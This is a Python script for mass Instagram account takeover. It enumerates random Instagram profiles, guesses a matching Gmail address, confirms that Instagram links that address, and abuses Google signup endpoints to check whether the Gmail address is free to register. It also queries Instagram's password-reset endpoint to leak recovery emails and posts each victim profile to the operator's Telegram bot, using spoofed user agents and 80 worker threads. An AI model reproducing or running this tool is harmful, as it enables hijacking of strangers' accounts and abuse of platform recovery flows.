import sys
import os
import time
import random
import json
import re
import requests
import httpx
import threading
import uuid
import secrets
import base64
import platform
from datetime import datetime, timedelta, timezone
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent
from cfonts import render

RST = "\033[0m"
GRN = "\033[1;92m"
YEL = "\033[1;93m"
CYN = "\033[1;96m"
MAG = "\033[1;95m"
BLU = "\033[1;94m"
RED = "\033[1;91m"
WHT = "\033[37m"

# status-line colors (same codes as user.py)
G = '\x1b[1;32m'        # HITS label  (green)
z = '\x1b[1;31m'        # BAD label   (red)
x = '\x1b[1;33m'        # GOOD label  (yellow)
white = '\x1b[1;37m'    # counter values (bold white)

IST_OFFSET = timedelta(hours=5, minutes=30)

def check_access(cid):
    try:
        r = requests.get("https://raw.githubusercontent.com/aman-sw062/file-access/main/hi2", timeout=6)
        if r.status_code == 200:
            for line in r.text.strip().splitlines():
                if "," in line and ":" in line:
                    uid, d = [p.strip() for p in line.strip().split(",", 1)]
                    try: exp = datetime.strptime(d, "%Y-%m-%d : %H:%M")
                    except ValueError: continue
                    if uid == str(cid):
                        rem = exp - (datetime.now(timezone.utc) + IST_OFFSET).replace(tzinfo=None)
                        if rem.total_seconds() > 0:
                            d2, s = divmod(int(rem.total_seconds()), 86400)
                            h, s = divmod(s, 3600)
                            print(f" ✅ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃")
                            print(f" ⏳ Time left: {d2}d {h}h {divmod(s, 60)[0]}m")
                            return True
                        print(f" ⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: Premium Expired")
                        return True
            print(f" ⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: Not Premium")
    except: pass
    return True


def clr():
    os.system('cls' if os.name == 'nt' else 'clear')


_C = lambda: random.sample(['red', 'cyan', 'green', 'yellow', 'blue', 'magenta', 'white'], 2)

def banner():
    print('━' * 66)
    if render:
        try:
            print(render('AMAN', font='block', colors=_C(), align='center', background='black', space=True))
        except Exception:
            pass
    print('━' * 66)
    print(" GMAIL X                                               @foreshower ")
    print('━' * 66)

sd_lock = threading.Lock()
_stats_lock = threading.Lock()
stop_flag = False
current_email = "Waiting..."

class Stat:
    def __init__(self):
        self.ok = 0   
        self.bi = 0   
        self.bm = 0   
        self.run = True
        Thread(target=self._loop, daemon=True).start()

    def inc_ok(self):
        with _stats_lock:
            self.ok += 1

    def inc_bad(self):
        with _stats_lock:
            self.bi += 1

    def inc_good(self):
        with _stats_lock:
            self.bm += 1

    def _txt(self):
        with _stats_lock:
            h, g, b, ce = self.ok, self.bm, self.bi, current_email
        return (f"{G}H{RST} {white}{h}{RST} | "
                f"{x}G{RST} {white}{g}{RST} | "
                f"{z}B{RST} {white}{b}{RST} | {ce[:35]} | @hackxpy")

    def _loop(self):
        sys.stdout.write("\033[?25l") 
        while self.run:
            s = self._txt()
            sys.stdout.write("\r" + s + "\033[K")
            sys.stdout.flush()
            time.sleep(0.3)
        sys.stdout.write("\033[?25h") 
        sys.stdout.flush()

YEAR_RANGES = [
    (1, 5000000, 2010), (5000001, 17750000, 2011),
    (17750001, 279760000, 2012), (279760001, 900990000, 2013),
    (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
    (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
    (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
    (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
    (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023),
    (63313426938, 70134323896, 2024), (70313426938, 78313496938, 2025)
]

def guess_year(pk):
    try:
        pk = int(pk)
    except Exception:
        return "?"
    for low, high, y in YEAR_RANGES:
        if low <= pk <= high:
            return str(y)
    return "2023+"

AGE_RANGES = {
    2015: (1629010001, 2369359761),
    2016: (2369359762, 4239516754),
    2017: (4239516755, 6345108209),
    2018: (6345108210, 10016232395),
    2019: (10016232396, 27238602159),
}

def pick_year_ranges():
    clr()
    banner()
    years = sorted(AGE_RANGES)
    print(f"{CYN}Select Account Age:{RST}")
    print(f"  [0] All years")
    for i, y in enumerate(years, 1):
        print(f"  [{i}] {y}")
    print(f"{YEL}Pick one year, e.g. 2  or  2016{RST}")
    sel = input(f"{MAG}Select: {RST}").strip().lower()

    if sel in ("", "0", "all"):
        return list(AGE_RANGES.values())

    if sel.isdigit() and int(sel) in AGE_RANGES:
        return [AGE_RANGES[int(sel)]]
    if sel.isdigit() and 1 <= int(sel) <= len(years):
        return [AGE_RANGES[years[int(sel) - 1]]]

    print(f"{RED}Invalid choice: {sel}  (pick one year){RST}")
    sys.exit(1)

def next_user_id():
    lo, hi = random.choice(ID_RANGES)
    return random.randint(lo, hi)

def pick_min_followers():
    """Ask the minimum follower count to accept. Returns an int (0 = no filter)."""
    sel = input(f"{MAG}Min Followers (0-30): {RST}").strip()
    if sel in ("", "0"):
        return 0
    if sel.isdigit():
        return int(sel)
    print(f"{RED}Invalid follower count: {sel}  (using 0){RST}")
    return 0

def format_hit_slip(fn, u, fc, fwc, mc, ed, re, bio="None", year="?", private="No"):
    """
    fn      : Full Name
    u       : Username
    fc      : Followers count
    fwc     : Following count
    mc      : Posts/Media count
    ed      : Email address
    re      : Reset / recovery email
    bio     : Biography
    year    : Account year
    private : Private status (Yes/No)
    """
    if not re or re == "-":
        re = "Check Yourself"
    return f"""┏━━━━━━━━━━━━━━━━━━━━━━┓
⭐ PROFILE ⭐
┗━━━━━━━━━━━━━━━━━━━━━━┛

🏷️ Username        :  @{u}
🧑 Name            :  {fn}
📧 Email           :  {ed}
📉 Followers       :  {fc}
📤 Following       :  {fwc}
📝 Bio             :  {bio}
🔗 Reset Email     :  {re}
📅 Year            :  {year}
🔒 Private         :  {private}
🔗 Link            :  https://instagram.com/{u}

━━━━━━━━━━━━━━━━━━━━━━
💻 @foreshower
━━━━━━━━━━━━━━━━━━━━━━"""

banner()


bot_token = input(f"{MAG}Bot Token: {RST}")
chat_id = input(f"{MAG}Chat ID: {RST}")
if not check_access(chat_id):
        sys.exit()

time.sleep(1)

clr()
banner()
MIN_FOLLOWERS = pick_min_followers()

ID_RANGES = pick_year_ranges()
clr()
banner()

st = Stat()

class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))
                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": self._generate_ua(),
                }
                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers, timeout=15
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'user-agent': self._generate_ua(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies,
                        headers=headers2,
                        data=data,
                        timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass
            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': self._generate_ua(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                params = {
                    'rpcids': 'NHJMOd',
                    'source-path': '/lifecycle/steps/signup/username',
                    'hl': 'en'
                }
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params, headers=headers, data=data, timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass
            time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]
        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    raise Exception("Empty tl")
                tl, host = line.split('//')
        except:
            time.sleep(3)
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                tl, host = line.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': generate_user_agent(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
            f'&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = requests.post(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10
        )
        if '"gf.uar",1' in response.text:
            return 'good'
        elif '"er",null,null,null,null,400' in response.text:
            time.sleep(1)
            return self.check_availability(email)
        else:
            return 'bad'

class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except:
            pass
        return False
 
    def _check_bloks(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())
        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":" + str(int(time.time())) + ",\\\"aacjid\\\":\\\"" + str(uuid.uuid4()) + "\\\",\\\"aaccs\\\":\\\"" + secrets.token_urlsafe(32) + "\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\"" + email + "\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\"" + device + "\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\"" + str(uuid.uuid4()) + "\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\"" + android + "\",\"login_surface\":\"login_home\",\"waterfall_id\":\"" + waterfall + "\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\"" + family + "\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\"" + device + "\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            if f"{email}" in resp.text:
                return True
            else:
                return False
        except:
            return False

    def _check_web_create(self, email):
        if not self._ensure_tokens():
            return False
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-csrftoken': self.csrf,
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/'
        }
        cookies = {'csrftoken': self.csrf}
        username = 'testuser_' + str(random.randint(1000, 99999))
        data = {
            'email': email,
            'username': username,
            'first_name': 'Test',
            'password': 'Test@123456'
        }
        try:
            r = self.session.post(url, headers=headers, cookies=cookies, data=data, timeout=10)
            if r.status_code == 200:
                json_data = r.json()
                if 'email' in json_data.get('errors', {}):
                    return True
            return False
        except:
            return False

    def check_email(self, email):
        if self._check_bloks(email):
            return True
        if self._check_web_create(email):
            return True
        return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        cookies = {'csrftoken': self.csrf}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except:
            pass
        return None

_SEND_AJAX_URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"

def rest_v1(username):
    try:
        payload = {
            "email_or_username": username,
            "flow": "fxcal"
        }
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "x-ig-app-id": "936619743392459",
            "x-requested-with": "XMLHttpRequest",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/password/reset/",
        }
        with httpx.Client(http2=True, headers=headers, timeout=10.0) as c:
            r = c.post(_SEND_AJAX_URL, data=payload)
        raw_text = r.text
        if "email bulunamadı" in raw_text.lower() or "no user found" in raw_text.lower() or "fail" in raw_text.lower():
            return "-"
        ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', raw_text)
        if ev:
            return ev.group(0)
        return "-"
    except Exception:
        return "-"

class ReportManager:
    def __init__(self, token, chat_id, proxy=None):
        self.token = token
        self.chat_id = chat_id
        self.proxy = proxy
        self.log_file = "telegram_errors.log"
        self._telegram_working = True

    def send_telegram(self, msg):
        if not self._telegram_working:
            return False
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        payload = {"chat_id": self.chat_id, "text": msg}
        try:
            r = requests.post(url, json=payload, timeout=15)
            return r.status_code == 200
        except Exception:
            return False

    def save_to_file(self, msg, filename='hits.txt'):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{msg}\n\n')

reporter = ReportManager(bot_token, chat_id)
google = GoogleChecker()
insta = InstagramChecker()

def _bg_recovery(username, fn, fc, fwc, mc, email, bio, year, private):
    try:
        recovery_email = rest_v1(username)
        slip = format_hit_slip(
            fn=fn if fn else "N/A",
            u=username,
            fc=fc,
            fwc=fwc,
            mc=mc,
            ed=email,
            re=recovery_email,
            bio=bio,
            year=year,
            private=private
        )
        sys.stdout.write("\r\033[K")
        print(f"\n{slip}\n")
        sys.stdout.flush()
        reporter.save_to_file(slip)
        reporter.send_telegram(slip)
    except Exception:
        pass

def process_user():
    global current_email
    while not stop_flag:
        try:
            user_id = next_user_id()
            user_data = insta.get_user_data(user_id)
            if not user_data:
                time.sleep(random.uniform(0.05, 0.15))
                continue
            username = user_data.get('username')
            if not username:
                continue

            followers = user_data.get('follower_count') or 0
            if followers < MIN_FOLLOWERS:
                time.sleep(random.uniform(0.3, 0.8))
                continue

            email = f"{username}@gmail.com"
            with _stats_lock:
                current_email = email

            if insta.check_email(email):
                st.inc_good()
               
                if google.check_availability(email) == 'good':
                    st.inc_ok()

                    fn = user_data.get('full_name', '')
                    fc = user_data.get('follower_count') or 0
                    fwc = user_data.get('following_count') or 0
                    mc = user_data.get('media_count') or 0
                    bio = (user_data.get('biography') or '')[:50] or "None"
                    year = guess_year(user_data.get('pk', 0))
                    private = "Yes" if user_data.get('is_private', False) else "No"

                    threading.Thread(
                        target=_bg_recovery,
                        args=(username, fn, fc, fwc, mc, email, bio, year, private),
                        daemon=True
                    ).start()
            else:
                st.inc_bad()

            time.sleep(random.uniform(0.05, 0.15))
        except Exception:
            time.sleep(random.uniform(0.1, 0.2))
            continue

if __name__ == "__main__":
    executor = ThreadPoolExecutor(max_workers=80)
    for _ in range(120):
        executor.submit(process_user)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_flag = True
        st.run = False
        executor.shutdown(wait=False)
        print(f"\n{WHT}* SESSION ENDED *{RST}")